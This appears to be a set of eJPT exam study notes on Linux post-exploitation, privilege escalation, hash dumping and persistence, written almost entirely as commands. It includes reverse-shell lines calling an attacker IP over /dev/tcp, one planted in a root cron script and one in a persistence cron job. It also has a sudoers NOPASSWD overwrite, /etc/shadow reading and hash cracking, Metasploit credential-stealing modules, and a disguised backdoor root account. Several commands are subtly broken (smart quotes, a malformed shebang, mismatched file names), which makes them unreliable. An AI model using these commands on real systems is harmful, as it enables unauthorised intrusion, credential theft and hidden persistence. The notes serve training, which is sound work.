## Linux Post Exploitation

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### SHELL
```
whoami
id user1
hostname
cat /etc/passwd - users registered in the system
cat /etc/passwd | grep home - users having an home folder
cat /etc/shadow - passwords hashes
history - shell history
cat ~/.*history | less - shell history
groups root - root group users
cat /etc/*issue - target system issue
uname -r - kernel version (short)
uname -a - kernel version (extended)
ifconfig
ip a s
ip route
netstat -antp - ports listening services
ps aux - running processes
ps -A - all processes
ps axjf - running processes (tree formatted)
env - environment variables
cat /proc/version - system processes information
```
### Metasploit
```
search enum_configs - configuration enumeration
post/multi/gather/env - OS enumeration
search enum_network - neteork resources enumeration
search enum_protections - protections enumeration 
search enum_system - system enumeration
search checkcontainer - check if the target is a container
search checkvm - check if the target is a VM
search enum_users_history - check for shell history of all users
```
## Linux privilege escalation

### Exploiting a vulnerable program (chkrootkit exploitation)

#### Meterpreter
```
shell
ps aux 
cat /bin/check-down
chkrootkit -v
```
#### Metaslpoit
```
search chkrootkit
set CHKROOTKIT /bin/chkrootkit
set session 2
set LHOST
```
### Misconfigured cron jobs

We need to find a job executed with root privilege to exploit. Use this command to list all cron jobs.
```
cat /etc/crontab
crontab -l
```
```
whoami
groups student
cat /etc/passwd
ls -al
cd /
grep -rnw /usr -e “/home/student/message”
ls -la /usr/local/share/copy.sh
```
If we discover a script, such as copy.sh, that has been executed with root privileges and is editable, we can insert this script into it (or replace it with a new file if it’s not the one to be directly executed).
This code is used to obtain a reverse shell for example.
```
#!/bin/bash bash -i >& /dev/tcp/192.164.224.4/41234 0>&1
```
This code is used to set the system to not ask for password after the command "sudo" is entered.
```
printf ‘!# /bin/bash\necho “student ALL=NOPASSWD:ALL” > /etc/sudoers’ >/usr/local/share/copy.sh
```
### SUID/SGID Binaries - [Reference](https://gtfobins.github.io)

#### SUID (Set Owner User ID)
Some useful command to search for this particular misconfiguration.
```
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
For example, if Python is in this list, we can use this command. to spawn a shell with root privileges.
```
./python -c 'import os; os.exec("/bin/sh", "sh", "-p")'
```
or
```
python -c ‘import pty; pty.spawn(“/bin/bash”)’
```

* suid-so - vulnerable to shared object injection
* suid-env - vulnerable to environment variables changing. ENV command can be abused to change a service specific path.


### Weak Permissions

We can search for files that aren't symbolic links and  are “world-writable” (writable by others, not just the file owner or group).
```
find / -not -type l -perm -o+w
```
#### Writable /etc/shadow
```
mkpasswd -m sha-512 newpasswordhere
```
Enter the new password in place of the existing one for the root account.

#### Writable /etc/passwd
```
openssl passwd newpasswordhere
```
Enter the new password in place of the existing one for the root account.

### SUDO Privileges - [Reference](https://gtfobins.github.io)

We can search for commands that can be executed with SUDO privileges without entering a password.
```
sudo -l
```
For example if the command "man" is in the list, i can use it to read a function manual, and then enter !/bin/bash to obtain an elevated shell.
```
sudo man ls
Another example with VIM.
sudo vim -c ‘!/bin/bash/ -i’
```
### PATH Vulnerability

We can search for writable folders with root privileges.
```
find / -type d -writable 2>/dev/null
```
Then we search for system PATH.
```
echo $PATH
```
If the folder we’re looking for isn’t listed in the PATH variable, we can manually add it.
```
export PATH=/home/murdoch:$PATH
```
Afterward, we create a new file in the root folder and execute it to gain root privileges.
```
echo “/bin/bash” > thm
chmod 777 thm
./test
```

### NFS - Network Files Sharing

We can search for shared folders. If we discover folder with "no_root_squash" attribute, we can assume the system is vulnerable.
```
cat /etc/exports
```
```
showmount -e 10.10.10.10
mkdir /tmp/backupAttack
mount -o rw 10.10.10.10:/backups /tmp/backupAttack
```
This way we can upload a file containing the !/bin/bash command.
Its execution grants us a root shell.
```
./nfs
```
### Mysql User Defined Function

If we can access the database as root user without a password, we can use raptor_udf2.c located in the folder /home/user/tools/mysql-udf 

### SSH Keys
```
ls -la /.ssh
```
In this folder we can find ssh.key useful to obtain persistence via ssh. We can copy all its content on the attacker machine and use it to connect to the target via ssh certificate.
This certificate might request a password. If we don't have it, we can try to decrypt the hash with Hashcat.
To use the key we need to change the privileges.
```
chmod 600 root_key
```
or
```
chmod 400 root_key
```
Then
```
ssh -i root_key root@10.10.10.10
```

### Kernel Exploit and others Exploit
```
/home/user/tools/privesc-scripts
```
### Linux password hashes dumping

All system passwords are stored in the file /etc/shadow usually accessibile only by root user.
```
$1 - MD5
$2 - Blowfish
$5 - SHA-256
$6 - SHA-512
```
#### Metasploit (Meterpreter)
```
shell
cat /etc/shadow
```
#### Metasploit
```
search hashdump
use post/linux/gather/hasdump
set options
run
use auxiliary/analyze/crack_linux
run
```
#### Metaslpoit other useful modules
```
post/multi/gather/ssh_creds
post/multi/gather/docker_creds
post/linux/gather/hashdump
post/linux/gather/ecryptfs_creds
post/linux/gather/enum_psk
post/linux/gather/enum_xchat
post/linux/gather/phpmyadmin_credsteal
post/linux/gather/pptpd_chap_secrets
post/linux/manage/sshkey_persistence
```
### Linux cracking password hashes

#### Metasploit
```
sessions -u 1
search hashdump (post/linux/gather/hashdump)
```
```
john —format=sha512crypt hash.txt —wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1800 hash /usr/share/wordlists/rockyou.txt
```
### Linux - Establish persistence

#### New root User

We need root access.
```
cat /etc/passwd
useradd -m ftp -s /bin/bash
passwd ftp
usermod -aG root ftp
usermod -u 15 ftp
```
These commands created a root user to access the SSH service, which appears to be legitimate.

#### Metasploit
```
search persistence platform:linux
apt_package_manager_persistence
cron_persistence
service persistence
sshkey_persistence
```
```
sshkey_persistence
set CREATESSHFOLDER true
set SESSION
run
```
If the username is empty, this mdule create the certificate for all the users.
```
vim ssh_key
chmod 0400 ssh_key
ssh -i ssh_key root@10.10.10.1
```
### Via SSH Keys
```
ssh account@10.10.10.1
cd .ssh/
id_rsa - where the private key is stored
scp student@10.10.10.1:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa student@10.10.10.1
```
### Persistence via CronJobs
```
ssh account@10.10.10.1
cat /etc/cron*
cat /etc/crontab
echo “* * * * * /bin/bash -c ‘bash -i >& /dev/tcp/192.164.224.2/1234 0>&1’” > cron - i 5
crontab -i cron
```
